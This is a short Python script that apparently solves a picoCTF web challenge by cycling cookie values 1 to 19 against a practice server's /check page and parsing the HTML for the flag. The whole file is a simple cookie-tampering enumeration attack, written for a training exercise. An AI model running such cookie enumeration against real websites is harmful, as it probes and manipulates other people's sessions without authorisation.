import requests
from bs4 import BeautifulSoup

for i in range(1, 20):
    try:
        post_headers = {
                "Cookie": f"name={i}",
        }
        url = "http://mercury.picoctf.net:21485/check"
        response = requests.get(url, headers=post_headers)
        response_text = response.text
        soup = BeautifulSoup(response_text, 'html.parser')
        b_tag_content = soup.find('b').text
        code_tag_content = soup.find('code').text
        print(f"Flag found in Cookie {i}: {code_tag_content}")
    except:
        print(f"Cookie {i} have no flag but contains: {b_tag_content}")
